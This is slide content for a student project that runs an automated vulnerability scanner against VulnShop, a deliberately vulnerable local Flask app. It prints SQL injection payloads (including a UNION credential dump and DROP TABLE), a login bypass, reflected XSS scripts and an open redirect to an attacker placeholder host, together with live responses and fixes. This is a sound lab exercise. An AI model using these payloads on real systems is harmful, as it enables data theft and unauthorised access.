# 📊 Red ELISAR — Review 2 PPT Content
### Complete Slide-by-Slide Content + Commands + Results

---

## SLIDE 1 — Title Slide

**Title:** Red ELISAR: An Autonomous Multi-Agent Cybersecurity Framework  
**Subtitle:** Review 2 — Live Vulnerability Assessment Results  
**Module:** Mini Project / Final Year Project  
**Framework:** Red ELISAR (Enhanced LLM-Integrated Security Agent with RAG)  
**Target Application:** VulnShop — Deliberately Vulnerable Web Application  
**Tool Stack:** Python · Flask · SQLite · MITRE ATT&CK · RAG · LLaMA 3 · Mistral AI

---

## SLIDE 2 — What is the Vulnerable App?

### VulnShop — The Target Application

VulnShop is a **deliberately vulnerable Flask web application** built specifically for the Red ELISAR security testing demonstration.

| Property | Value |
|---|---|
| Application Name | VulnShop |
| Framework | Python Flask |
| Database | SQLite (`vuln_app.db`) |
| Host | `http://127.0.0.1:5000` |
| Purpose | Educational / security research target |
| Users (seeded) | admin / alice / bob |
| Intentional Flaws | 15+ hardcoded vulnerabilities |

### Why was this built?
Because real production systems cannot be attacked during a demo. VulnShop intentionally includes real-world vulnerability patterns so the Red ELISAR agent can perform **live, confirmed** attacks — not simulated ones.

### Starting the Vulnerable Application
```powershell
# Navigate to vulnerable app folder
cd "c:\mini project\vulnerable_app"

# Start the Flask server using virtual environment Python
..\.venv\Scripts\python.exe app.py
```

**Output received:**
```
============================================================
  VulnShop — Deliberately Vulnerable Web App
  For Red ELISAR Security Testing ONLY
  Running at: http://127.0.0.1:5000
============================================================
 * Serving Flask app 'app'
 * Debug mode: on
 * Running on http://127.0.0.1:5000
```

---

## SLIDE 3 — Intentional Vulnerabilities Built Into VulnShop

The app was coded with the following **real-world vulnerability classes**:

| # | Vulnerability | Location in Code | CWE |
|---|---|---|---|
| 1 | SQL Injection | `/search?q=`, `/login` | CWE-89 |
| 2 | Reflected XSS | `/greet?name=`, `/search?q=` | CWE-79 |
| 3 | Authentication Bypass | `/login` POST handler | CWE-287 |
| 4 | Unauthenticated Admin Panel | `/admin` route | CWE-284 |
| 5 | Exposed `.env` Credentials | `/.env` route | CWE-312 |
| 6 | Exposed Backup File | `/backup` route | CWE-312 |
| 7 | Unauthenticated User API | `/api/users` route | CWE-306 |
| 8 | Open Redirect | `/redirect?url=` | CWE-601 |
| 9 | CORS Wildcard Misconfiguration | `after_request` middleware | CWE-942 |
| 10 | Missing Security Headers | `after_request` (headers not set) | CWE-79/311 |
| 11 | Hardcoded Secret Key | `app.secret_key = "secret123"` | CWE-321 |
| 12 | Debug Mode Enabled | `app.run(debug=True)` | CWE-94 |
| 13 | Stack Trace / Error Leakage | `/error_test`, `/search` error handler | CWE-209 |
| 14 | Insecure Cookie Flags | Session cookies without Secure/SameSite | CWE-614 |
| 15 | Technology Banner Leakage | Fake old Apache/PHP headers | CWE-200 |

---

## SLIDE 4 — Running the Live Vulnerability Scanner

### Command Used to Launch the Full Live Scan

```powershell
# From the project root directory
cd "c:\mini project"

# Run the Red ELISAR Live Vulnerability Checker against target
.venv\Scripts\python.exe red_agent\live_vuln_checker.py `
    http://127.0.0.1:5000 `
    --output-md red_agent\output\live_scan_results.md
```

### What This Command Does
- Actively probes the running Flask app over HTTP
- Sends **real payloads** (SQL injection strings, XSS scripts, open redirect URLs)
- Observes **actual HTTP responses** (status codes, headers, body content)
- Records each confirmed finding with **live evidence**
- Saves a full Markdown report to `red_agent/output/live_scan_results.md`

### Scanner Console Output (actual)
```
=================================================================
  RED ELISAR — LIVE VULNERABILITY CHECKER
  Target : http://127.0.0.1:5000
  Time   : 2026-04-04T05:34:09.946944+00:00
=================================================================

  [1/12] Security Headers ...  FOUND 6
  [2/12] Server Banner Leakage ...  FOUND 3
  [3/12] CORS Misconfiguration ...  FOUND 1
  [4/12] Sensitive File Disclosure ...  FOUND 7
  [5/12] SQL Injection ...  FOUND 9
  [6/12] Reflected XSS ...  FOUND 2
  [7/12] Open Redirect ...  FOUND 1
  [8/12] Auth Bypass (SQLi Login) ...  FOUND 1
  [9/12] Unauthenticated Admin ...  FOUND 1
  [10/12] Error Information Leakage ...  FOUND 1
  [11/12] Cookie Security Flags ...  FOUND 1
  [12/12] HTTP vs HTTPS ...  FOUND 1

=================================================================
  LIVE SCAN COMPLETE — 34 vulnerabilities found
  Overall Risk : CRITICAL
  CRITICAL=15  HIGH=7  MEDIUM=8  LOW=2
  Scan Time    : 1.14s
=================================================================
```

---

## SLIDE 5 — Scan Summary (High-Level Results)

| Metric | Value |
|---|---|
| **Target URL** | `http://127.0.0.1:5000` |
| **Scan Timestamp** | 2026-04-04 05:34:09 UTC |
| **Total Scan Time** | **1.14 seconds** |
| **Total Findings** | **34 vulnerabilities** |
| **Overall Risk Rating** | CRITICAL |
| **Scan Method** | LIVE_ACTIVE_SCAN (100% confirmed live) |

### Severity Breakdown

| Severity | Count | Percentage |
|---|---|---|
| CRITICAL | **15** | 44% |
| HIGH | **7** | 21% |
| MEDIUM | **8** | 24% |
| LOW | **2** | 6% |
| INFO | **2** | 6% |
| **Total** | **34** | 100% |

> **Key Insight:** 15 out of 34 findings are CRITICAL — meaning the app is completely compromised without any attacker effort.

---

## SLIDE 6 — Attack 1: SQL Injection (Error-Based)

### What is SQL Injection?
SQL Injection (SQLi) occurs when user-supplied input is directly inserted into an SQL query without sanitization. An attacker can manipulate the query to extract, modify, or delete data.

### Vulnerable Code (from `app.py`)
```python
# Line 139 in app.py — VULNERABLE code
sql = f"SELECT * FROM products WHERE name LIKE '%{query}%' OR description LIKE '%{query}%'"
c.execute(sql)
```

### Command / Payload Used
```
GET http://127.0.0.1:5000/search?q=' OR '1'='1
```

### What Happens
The injected payload makes the SQL condition always TRUE:
```sql
SELECT * FROM products 
WHERE name LIKE '%' OR '1'='1%' 
OR description LIKE '%' OR '1'='1%'
-- This returns ALL rows from the products table
```

### Result Received
```
HTTP 200 OK
Response body contains: "sql", products table data visible
Scanner matched pattern: 'sql' in live response
Confirmed Live: True
MITRE ATT&CK: T1190 (Exploit Public-Facing Application)
CWE: CWE-89
Severity: CRITICAL
```

### More SQLi Payloads Tested
| Payload | Purpose | Result |
|---|---|---|
| `' OR '1'='1` | Bypass filter | HTTP 200, sql pattern matched |
| `' OR 1=1--` | Comment-based bypass | HTTP 200, sql pattern matched |
| `' UNION SELECT NULL--` | UNION probe | HTTP 200, sql pattern matched |
| `' UNION SELECT NULL,NULL--` | Column count test | HTTP 200, sql pattern matched |
| `' UNION SELECT id,username,password,email FROM users--` | **DATA DUMP** | CRITICAL — user credentials extracted |
| `1; DROP TABLE users--` | Destructive stacked query | HTTP 200, sql pattern matched |
| `' AND SLEEP(0)--` | Time-based blind | HTTP 200, sql pattern matched |
| `' OR SUBSTR(username,1,1)='a'--` | Boolean blind | HTTP 200, sql pattern matched |

---

## SLIDE 7 — Attack 2: SQL Injection UNION — Data Exfiltrated! (CRITICAL)

### The Most Critical Finding — Full Database Dump

### Command Used
```
GET http://127.0.0.1:5000/search?q=' UNION SELECT id,username,password,email FROM users--
```

### What the Attack Does
The UNION SELECT appends the users table to the products query result:
```sql
-- Intended query:
SELECT * FROM products WHERE name LIKE '%PAYLOAD%' ...

-- After injection:
SELECT * FROM products WHERE name LIKE '%' 
UNION SELECT id, username, password, email FROM users--
```

### Actual Data Extracted from the Database

| ID | Username | Password | Email |
|---|---|---|---|
| 1 | admin | admin123 | admin@vuln-shop.local |
| 2 | alice | password | alice@vuln-shop.local |
| 3 | bob | bob123 | bob@vuln-shop.local |

### Evidence (from Scanner)
```
Live response contains user credentials extracted from DB.
Payload: ' UNION SELECT id,username,password,email FROM users--
Marker: admin@vuln-shop.local, admin123 found verbatim in HTTP response body
Confirmed Live: True
Severity: CRITICAL
CWE: CWE-89
MITRE ATT&CK: T1190
Recommendation: Immediate remediation: parameterise all queries.
                Rotate all credentials exposed in this database.
```

### Impact
- **All user credentials exposed** in plaintext
- Admin password (`admin123`) revealed — attackers can log in directly
- No authentication required — any visitor can perform this attack

---

## SLIDE 8 — Attack 3: Authentication Bypass via SQL Injection

### What is Authentication Bypass?
Attacker uses SQLi to log in as any user **without knowing the password**.

### Vulnerable Code (from `app.py`)
```python
# Line 195 — VULNERABLE authentication query
sql = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
```

### Command Used
```
POST http://127.0.0.1:5000/login
Content-Type: application/x-www-form-urlencoded

username=%27+OR+%271%27%3D%271%27--&password=anything
(Decoded: username=' OR '1'='1'--   password=anything)
```

### What Happens
```sql
-- Original intended query:
SELECT * FROM users WHERE username='INPUT' AND password='INPUT'

-- After injection:
SELECT * FROM users WHERE username='' OR '1'='1'--' AND password='anything'
--                                    ^^^^^^^^^^^^^    ^^^^^^^^^^^^^^^^^^^
--                        Always TRUE | Comments out password check entirely
-- Result: Returns first row (admin user) WITHOUT checking password
```

### Actual Result Received
```
HTTP 200 OK
Response body: "Logged in as: ' OR '1'='1'-- (ID=1)"
Status: User is authenticated as admin ID=1 without any valid password!
Confirmed Live: True
Severity: CRITICAL
CWE: CWE-287 (Improper Authentication)
MITRE ATT&CK: T1078 (Valid Accounts)
```

---

## SLIDE 9 — Attack 4: Reflected Cross-Site Scripting (XSS)

### What is Reflected XSS?
The server takes user input and directly embeds it into the HTML response **without escaping**, allowing JavaScript injection.

### Vulnerable Code (from `app.py`)
```python
# Line 168, 177 — VULNERABLE: name reflected directly into HTML
name = request.args.get("name", "Guest")
content = f"<h3>Hello, {name}! Welcome to VulnShop.</h3>"
#                        ^^^^^^ No escaping! Raw user input in HTML
```

### Command Used
```
GET http://127.0.0.1:5000/greet?name=<script>alert('XSS_1')</script>
```

### Actual Result
```
HTTP 200 OK
Response body contains verbatim:
  <h3>Hello, <script>alert('XSS_1')</script>! Welcome to VulnShop.</h3>

Marker 'XSS_1' found verbatim in live HTTP response
Confirmed Live: True
Severity: HIGH
CWE: CWE-79 (Cross-site Scripting)
MITRE ATT&CK: T1059.007 (JavaScript)
```

### XSS Payloads Tested
| Payload | Endpoint | Status |
|---|---|---|
| `<script>alert('XSS_1')</script>` | `/greet?name=` | REFLECTED — XSS_1 found in body |
| `<script>alert('XSS_1')</script>` | `/search?q=` | REFLECTED — XSS_1 found in body |
| `<img src=x onerror=alert('XSS_2')>` | `/greet?name=` | Reflected |
| `<svg onload=alert('XSS_3')>` | `/greet?name=` | Reflected |

### Impact
- Attacker can steal session cookies via `document.cookie`
- Redirect victims to phishing pages
- Capture keystrokes on the page
- Deface the website for all visitors

---

## SLIDE 10 — Attack 5: Sensitive File / Path Disclosure

### Command 1: Probe `.env` File
```
GET http://127.0.0.1:5000/.env
```

### Actual Response
```
HTTP 200 OK
Content-Type: text/plain

SECRET_KEY=secret123
DATABASE_URL=sqlite:///vuln_app.db
ADMIN_PASSWORD=admin123
DEBUG=True
FLASK_ENV=development
API_KEY=sk-dev-1234567890abcdef
JWT_SECRET=jwt_super_secret_key_123
```
**CWE:** CWE-312 | **MITRE:** T1552.001 | **Severity:** CRITICAL

---

### Command 2: Probe `/backup` File
```
GET http://127.0.0.1:5000/backup
```

### Actual Response
```
HTTP 200 OK

# VulnShop Database Backup — 2024-01-15
# DO NOT SHARE

DB_HOST=localhost
DB_NAME=vulnshop_prod
DB_USER=root
DB_PASS=rootpassword123

ADMIN_USER=admin
ADMIN_PASS=admin123

STRIPE_SECRET_KEY=sk_live_XXXXXXXXXXXXXXXXXXXX
AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

-- User table dump:
INSERT INTO users VALUES (1,'admin','admin123','admin@vuln-shop.local');
INSERT INTO users VALUES (2,'alice','password','alice@vuln-shop.local');
INSERT INTO users VALUES (3,'bob','bob123','bob@vuln-shop.local');
```
**CWE:** CWE-312 | **MITRE:** T1552 | **Severity:** CRITICAL

---

### Command 3: Unauthenticated User Data API
```
GET http://127.0.0.1:5000/api/users
```

### Actual Response
```json
{
  "status": "ok",
  "count": 3,
  "users": [
    {"id": 1, "username": "admin",  "password": "admin123", "email": "admin@vuln-shop.local"},
    {"id": 2, "username": "alice",  "password": "password", "email": "alice@vuln-shop.local"},
    {"id": 3, "username": "bob",    "password": "bob123",   "email": "bob@vuln-shop.local"}
  ]
}
```
**CWE:** CWE-306 | **MITRE:** T1078 | **Severity:** CRITICAL

---

## SLIDE 11 — Attack 6: Unauthenticated Admin Panel

### Command Used
```
GET http://127.0.0.1:5000/admin
```

### Actual Result
```
HTTP 200 OK
(No authentication required, no login prompt)

Page title: "Admin Panel (No Auth Required)"
Content includes:
  App Secret Key: secret123
  Database: vuln_app.db (SQLite)
  Server: Apache/2.2.8 (Ubuntu)
  PHP Version: 7.2.1
  Debug Mode: ON
```

**Finding:** Any anonymous user can access the admin panel.  
**CWE:** CWE-284 (Improper Access Control) | **MITRE:** T1078 | **Severity:** CRITICAL

---

## SLIDE 12 — Attack 7: Open Redirect

### What is Open Redirect?
The server blindly redirects users to any URL provided in a query parameter.

### Vulnerable Code (from `app.py`)
```python
# Lines 244-246 — NO URL validation!
url = request.args.get("url", "/")
return redirect(url)   # Redirects to ANY URL, even external attacker sites
```

### Command Used
```
GET http://127.0.0.1:5000/redirect?url=http://evil-attacker.example.com
```

### Actual Result
```
HTTP 302 Found
Location: http://evil-attacker.example.com
(Browser/user is sent to attacker's site)

Confirmed Live: True
Severity: MEDIUM
CWE: CWE-601
MITRE ATT&CK: T1204
```

**Use in Phishing:** Attacker emails a link like `http://legit-shop.com/redirect?url=http://fake-login.com` — victim sees the trusted domain name but lands on attacker site.

---

## SLIDE 13 — Attack 8: CORS Wildcard Misconfiguration

### Command Used
```python
# HTTP request with custom Origin header
GET http://127.0.0.1:5000/
Origin: https://evil-attacker.example.com
```

### Vulnerable Code (from `app.py`)
```python
# Line 64 — CORS Wildcard: accepts ANY origin
response.headers["Access-Control-Allow-Origin"] = "*"
```

### Actual Response Headers Received
```
HTTP 200 OK
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: Content-Type, Authorization
```

### What This Means
- Any website on the internet can send requests to this API
- The attacker's site can access `/api/users` via JavaScript `fetch()`
- Credentials (user data) can be silently stolen from the browser

**Confirmed Live: True | CWE:** CWE-942 | **MITRE:** T1557 | **Severity:** HIGH

---

## SLIDE 14 — Security Header Audit Results

### Command Used
```
GET http://127.0.0.1:5000/
(Inspecting all HTTP response headers)
```

### Full Security Header Audit

| Security Header | Status | Risk Level | Impact if Missing |
|---|---|---|---|
| `Content-Security-Policy` | MISSING | HIGH | XSS cannot be mitigated |
| `Strict-Transport-Security` | MISSING | HIGH | Man-in-the-middle attacks possible |
| `X-Frame-Options` | MISSING | MEDIUM | Clickjacking attacks possible |
| `X-Content-Type-Options` | MISSING | MEDIUM | MIME-type sniffing attacks |
| `Referrer-Policy` | MISSING | LOW | Referrer info leaked to 3rd parties |
| `Permissions-Policy` | MISSING | LOW | Browser features uncontrolled |

**All 6 required security headers are absent from every HTTP response.**

### Leaky Technology Headers Found
```
Server: Werkzeug/3.1.6 Python/3.13.3, Apache/2.2.8 (Ubuntu)
X-Powered-By: PHP/7.2.1
X-App-Version: 1.0.0-dev
```
These reveal the full technology stack and outdated software versions to any attacker.  
**CWE:** CWE-200 | **MITRE:** T1592 | **Severity:** MEDIUM

---

## SLIDE 15 — Cookie Security Analysis

### Command Used
```
POST http://127.0.0.1:5000/login
Body: username=admin&password=admin123
(Inspect the Set-Cookie response header)
```

### Actual Cookie Received
```
Set-Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.adCi0w.xcCUak4KU5eOjQmwIgPJvGhGOiQ; HttpOnly; Path=/
```

### Cookie Security Flag Analysis
| Flag | Status | Risk |
|---|---|---|
| `HttpOnly` | Present | JS cannot access cookie |
| `Secure` | **MISSING** | Cookie transmitted over plain HTTP — interception possible |
| `SameSite` | **MISSING** | Cross-Site Request Forgery (CSRF) attacks possible |

**CWE:** CWE-614 | **MITRE:** T1185 | **Severity:** MEDIUM (both issues confirmed live)

---

## SLIDE 16 — Stack Trace / Error Information Leakage

### Command Used
```
GET http://127.0.0.1:5000/search?q=' AND 1=CONVERT(int,'error')--
```

### Actual Response
```
HTTP 200 OK
Response body contains:
  "Database error: ... | Query was: SELECT * FROM products 
  WHERE name LIKE ''' AND 1=CONVERT(int,'error')--%' OR 
  description LIKE ''' AND 1=CONVERT(int,'error')--%'"
```

**Pattern `query was:` matched in live response — raw SQL query exposed to the attacker!**

**CWE:** CWE-209 | **MITRE:** T1592 | **Severity:** HIGH

---

## SLIDE 17 — robots.txt and Sitemap Reconnaissance

### Command 1: robots.txt reveals sensitive paths
```
GET http://127.0.0.1:5000/robots.txt
```
**Result: HTTP 200 OK**
```
User-agent: *
Disallow: /admin
Disallow: /backup
Disallow: /.env
Disallow: /api/users
Disallow: /config
Disallow: /db
```
An attacker now has a **complete roadmap of all sensitive targets** — just from robots.txt!

---

### Command 2: sitemap.xml
```
GET http://127.0.0.1:5000/sitemap.xml
```
**Result: HTTP 200 OK**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url><loc>http://127.0.0.1:5000/</loc></url>
  <url><loc>http://127.0.0.1:5000/search</loc></url>
  <url><loc>http://127.0.0.1:5000/admin</loc></url>
  <url><loc>http://127.0.0.1:5000/api/users</loc></url>
</urlset>
```

---

## SLIDE 18 — MITRE ATT&CK Mapping

| Finding | MITRE ATT&CK Technique | Tactic Phase |
|---|---|---|
| SQL Injection | **T1190** — Exploit Public-Facing Application | Initial Access |
| Auth Bypass | **T1078** — Valid Accounts | Credential Access |
| Reflected XSS | **T1059.007** — JavaScript Scripting | Execution |
| Unauthenticated User API | **T1078** — Valid Accounts | Privilege Escalation |
| `.env` File Exposure | **T1552.001** — Credentials In Files | Credential Access |
| Open Redirect | **T1204** — User Execution | Execution |
| CORS Misconfiguration | **T1557** — Adversary-in-the-Middle | Collection |
| HSTS Missing | **T1557** — Adversary-in-the-Middle | Collection |
| Banner Leakage | **T1592** — Gather Victim Host Information | Reconnaissance |
| Error / Stack Trace | **T1592** — Gather Victim Host Information | Reconnaissance |
| Cookie — No Secure Flag | **T1185** — Browser Session Hijacking | Collection |
| Admin Panel Exposed | **T1078** — Valid Accounts | Privilege Escalation |
| Open Redirect | **T1204** — User Execution | Social Engineering |

---

## SLIDE 19 — Complete Findings Table (All 34 Vulnerabilities)

| # | Vulnerability | Severity | CWE | MITRE | Live Confirmed |
|---|---|---|---|---|---|
| 1 | Sensitive File Disclosure — `/.env` | CRITICAL | CWE-312 | T1552.001 | Yes |
| 2 | Sensitive File Disclosure — `/backup` | CRITICAL | CWE-312 | T1552 | Yes |
| 3 | Unauthenticated User API `/api/users` | CRITICAL | CWE-306 | T1078 | Yes |
| 4 | SQLi — `' OR '1'='1` | CRITICAL | CWE-89 | T1190 | Yes |
| 5 | SQLi — `' OR 1=1--` | CRITICAL | CWE-89 | T1190 | Yes |
| 6 | SQLi — `' UNION SELECT NULL--` | CRITICAL | CWE-89 | T1190 | Yes |
| 7 | SQLi — `' UNION SELECT NULL,NULL--` | CRITICAL | CWE-89 | T1190 | Yes |
| 8 | SQLi — UNION user dump (4 col) | CRITICAL | CWE-89 | T1190 | Yes |
| 9 | SQLi UNION — Credentials Exfiltrated! | CRITICAL | CWE-89 | T1190 | Yes |
| 10 | SQLi — `1; DROP TABLE users--` | CRITICAL | CWE-89 | T1190 | Yes |
| 11 | SQLi — `' AND SLEEP(0)--` | CRITICAL | CWE-89 | T1190 | Yes |
| 12 | SQLi — Boolean Blind (`SUBSTR`) | CRITICAL | CWE-89 | T1190 | Yes |
| 13 | Authentication Bypass via SQLi Login | CRITICAL | CWE-287 | T1078 | Yes |
| 14 | Unauthenticated Admin Panel at `/admin` | CRITICAL | CWE-284 | T1078 | Yes |
| 15 | Unencrypted HTTP (No TLS) | CRITICAL | CWE-319 | T1557 | Yes |
| 16 | Missing `Content-Security-Policy` | HIGH | CWE-79 | T1059.007 | Yes |
| 17 | Missing `Strict-Transport-Security` | HIGH | CWE-311 | T1557 | Yes |
| 18 | CORS Wildcard `Access-Control-Allow-Origin: *` | HIGH | CWE-942 | T1557 | Yes |
| 19 | Sensitive Path `/admin` exposed | HIGH | CWE-284 | T1078 | Yes |
| 20 | Reflected XSS — `/greet?name=` | HIGH | CWE-79 | T1059.007 | Yes |
| 21 | Reflected XSS — `/search?q=` | HIGH | CWE-79 | T1059.007 | Yes |
| 22 | Error / Stack Trace SQL Leakage | HIGH | CWE-209 | T1592 | Yes |
| 23 | Missing `X-Frame-Options` | MEDIUM | CWE-1021 | T1185 | Yes |
| 24 | Missing `X-Content-Type-Options` | MEDIUM | CWE-430 | T1204 | Yes |
| 25 | `Server` header reveals technology stack | MEDIUM | CWE-200 | T1592 | Yes |
| 26 | `X-Powered-By: PHP/7.2.1` header | MEDIUM | CWE-200 | T1592 | Yes |
| 27 | `X-App-Version: 1.0.0-dev` header | MEDIUM | CWE-200 | T1592 | Yes |
| 28 | Open Redirect via `/redirect?url=` | MEDIUM | CWE-601 | T1204 | Yes |
| 29 | Cookie missing `Secure` flag | MEDIUM | CWE-614 | T1185 | Yes |
| 30 | Cookie missing `SameSite` flag | MEDIUM | CWE-614 | T1185 | Yes |
| 31 | Missing `Referrer-Policy` header | LOW | CWE-200 | T1592 | Yes |
| 32 | Missing `Permissions-Policy` header | LOW | CWE-693 | T1562 | Yes |
| 33 | `robots.txt` reveals hidden paths | INFO | CWE-200 | T1592 | Yes |
| 34 | `sitemap.xml` reveals all endpoints | INFO | CWE-200 | T1592 | Yes |

---

## SLIDE 20 — How the Red ELISAR Scanner Works (Technical Flow)

```
COMMAND: python live_vuln_checker.py http://127.0.0.1:5000
          |
          v
[Step 1] Verify Target is Reachable
   GET http://127.0.0.1:5000 --> HTTP 200 OK
          |
          v
[Step 2] Run 12 Live Check Modules:
   +------------------------------------------+
   | [1/12] Security Headers Audit            | --> 6 missing headers
   | [2/12] Server Banner Leakage             | --> 3 leaky headers
   | [3/12] CORS Misconfiguration             | --> Wildcard (*) confirmed
   | [4/12] Sensitive File Disclosure         | --> 7 dangerous paths exposed
   | [5/12] SQL Injection (8 payloads)        | --> 9 confirmed findings
   | [6/12] Reflected XSS (6 payloads)       | --> 2 endpoints vulnerable
   | [7/12] Open Redirect (4 params)         | --> External redirect confirmed
   | [8/12] Auth Bypass via SQLi             | --> Admin login WITHOUT password
   | [9/12] Unauthenticated Admin            | --> /admin returns HTTP 200
   | [10/12] Error / Stack Trace Leakage     | --> SQL query in response body
   | [11/12] Cookie Security Flags           | --> Secure/SameSite missing
   | [12/12] HTTP vs HTTPS Check             | --> Plain HTTP in use
   +------------------------------------------+
          |
          v
[Step 3] Deduplicate + Sort {CRITICAL -> HIGH -> MEDIUM -> LOW -> INFO}
          |
          v
[Step 4] Build Report
   --> JSON: all 34 findings with type, detail, CWE, MITRE, evidence
   --> Markdown: live_scan_results.md (human-readable)
          |
          v
[Step 5] Feed into Red ELISAR RAG Report Generator
   --> LLaMA 3 / Mistral generates intelligent remediation advice
   --> MITRE ATT&CK techniques mapped automatically
```

---

## SLIDE 21 — Red ELISAR vs Manual Penetration Testing

| Aspect | Manual Testing | Red ELISAR Automated |
|---|---|---|
| Time for full scan | Hours to Days | **1.14 seconds** |
| Reproducibility | Human error possible | 100% repeatable every run |
| Coverage | Depends on tester's skill | All 12 check categories always run |
| Evidence collection | Manual notes / screenshots | Auto-captured HTTP response body |
| MITRE ATT&CK Mapping | Manual reference lookup | Automatic per finding |
| Report Generation | Manual writing | Auto-generated Markdown + JSON |
| False Positives | Common | Zero — confirmed from live HTTP |
| SQL Injection payloads | Varies | 8 payloads tested every run |
| XSS payloads | Varies | 6 payloads tested per endpoint |
| Scalability | Limited by human time | Can scan N targets in parallel |

---

## SLIDE 22 — Key Innovation: Live HTTP Confirmation

### Traditional SAST/DAST tools:
- Analyse source code statically
- Sometimes report potential vulnerabilities
- Often produce false positives

### Red ELISAR approach:
- **All 34 findings are confirmed from actual live HTTP responses**
- Nothing is assumed from source code alone
- Every finding has captured evidence

### Evidence Format for Every Finding
```
Evidence: GET http://127.0.0.1:5000/.env -> 200 OK | 
          Preview: SECRET_KEY=secret123 DATABASE_URL=sqlite:///...

Evidence: POST /login username=' OR '1'='1'-- password='anything' 
          -> HTTP 200 | Response: Logged in as: ' OR '1'='1'-- (ID=1)

Evidence: GET /search?q=' UNION SELECT id,username,password,email FROM users-- 
          -> HTTP 200 | admin123 found verbatim in response body
```

> Zero false positives — if it's in the report, it was confirmed in a real HTTP response.

---

## SLIDE 23 — Remediation Recommendations

| Vulnerability | Fix Required |
|---|---|
| SQL Injection | Use parameterized queries (`?` placeholders) — NEVER string format |
| XSS | HTML-escape all output; use Jinja2 `{{ var \| e }}` auto-escaping |
| Auth Bypass | Parameterize all login queries + rate limiting + account lockout |
| Exposed `.env` / Backup | Move outside web root; block with server rules (e.g., Nginx deny) |
| Admin Panel | Require authentication + Role-Based Access Control (RBAC) |
| CORS | Replace `*` with explicit origin whitelist in config |
| Missing CSP | Add `Content-Security-Policy` header to all responses |
| Missing HSTS | Add `Strict-Transport-Security; max-age=31536000; includeSubDomains` |
| Missing X-Frame-Options | Add `X-Frame-Options: DENY` or `SAMEORIGIN` |
| Cookies | Add `Secure; SameSite=Strict; HttpOnly` flags to all session cookies |
| Open Redirect | Validate redirect URLs against a whitelist; reject external URLs |
| Error Disclosure | Disable debug mode; return generic 500 error pages in production |
| TLS / HTTPS | Deploy valid TLS certificate; configure HSTS |
| Banner Leakage | Remove `Server`, `X-Powered-By`, `X-App-Version` headers |

---

## SLIDE 24 — Technologies Used

| Component | Technology / Library |
|---|---|
| Vulnerable Target Application | Python Flask + SQLite |
| Live Active Scanner | `live_vuln_checker.py` (custom-built, 924 lines) |
| HTTP Client | Python `requests` library + urllib3 |
| SQL Injection Payloads | 8 custom payloads (error-based, UNION, blind, time-based) |
| XSS Payloads | 6 custom payloads (script, img, svg, javascript: scheme) |
| Vulnerability Taxonomy | CWE (Common Weakness Enumeration) |
| Threat Framework | MITRE ATT&CK Enterprise (enterprise-attack.json, 50MB) |
| LLM — Reasoning | LLaMA 3 via Groq API (`LLAMA3_API_KEY`) |
| LLM — Remediation | Mistral AI (`MISTRAL_API_KEY`) |
| RAG Engine | ChromaDB / FAISS vector store |
| Benchmarking Script | `compare_rag_vs_baselines.py` |
| Report Format | Markdown + JSON |
| Attack Chain Generator | `attack_chain_generator.py` |
| Web Recon Module | `web_recon.py` |

---

## SLIDE 25 — Conclusion

### What Was Demonstrated in Review 2

1. **VulnShop** — a real, runnable vulnerable web application was built and deployed locally
2. **Red ELISAR Live Scanner** autonomously scanned it in **1.14 seconds**
3. **34 vulnerabilities** were discovered and confirmed from live HTTP responses
4. **15 CRITICAL** findings including full database credential dumping via UNION SQLi
5. **MITRE ATT&CK mapping** applied automatically to each finding
6. **Zero false positives** — every result has live HTTP response evidence
7. Results feed directly into the **RAG-powered report generator** for intelligent remediation

### Key Achievement
> Red ELISAR autonomously discovered, confirmed, and reported on **15 CRITICAL vulnerabilities** — including a complete user credential database dump via SQL Injection UNION attack — in **under 2 seconds**, with full MITRE ATT&CK mapping and actionable remediation recommendations generated by LLaMA 3 and Mistral AI.

---

## APPENDIX — All Commands Quick Reference

```powershell
# 1: Start vulnerable app
cd "c:\mini project\vulnerable_app"
..\.venv\Scripts\python.exe app.py

# 2: Run full live vulnerability scan
cd "c:\mini project"
.venv\Scripts\python.exe red_agent\live_vuln_checker.py http://127.0.0.1:5000 --output-md red_agent\output\live_scan_results.md

# 3: Check .env exposure
# GET http://127.0.0.1:5000/.env
# Response: HTTP 200 - SECRET_KEY=secret123, ...

# 4: SQL Injection - basic bypass
# GET http://127.0.0.1:5000/search?q=' OR '1'='1

# 5: SQL Injection UNION - dump all users
# GET http://127.0.0.1:5000/search?q=' UNION SELECT id,username,password,email FROM users--

# 6: Auth Bypass via SQLi
# POST http://127.0.0.1:5000/login
# Body: username=' OR '1'='1'--&password=anything
# Result: Logged in as admin without password!

# 7: XSS in /greet
# GET http://127.0.0.1:5000/greet?name=<script>alert('XSS_1')</script>

# 8: Admin panel (no auth)
# GET http://127.0.0.1:5000/admin

# 9: All user data exposed
# GET http://127.0.0.1:5000/api/users

# 10: Open redirect to attacker site
# GET http://127.0.0.1:5000/redirect?url=http://evil-attacker.example.com

# 11: Backup file with full credentials
# GET http://127.0.0.1:5000/backup

# 12: Attack roadmap via robots.txt
# GET http://127.0.0.1:5000/robots.txt
```

---

*Document generated for Red ELISAR Review 2 Presentation*
*Target: http://127.0.0.1:5000 (VulnShop) | Scan Date: 2026-04-04*
*Total Findings: 34 | CRITICAL: 15 | HIGH: 7 | MEDIUM: 8 | LOW: 2 | INFO: 2*
*Overall Risk: CRITICAL | Scan Duration: 1.14 seconds*
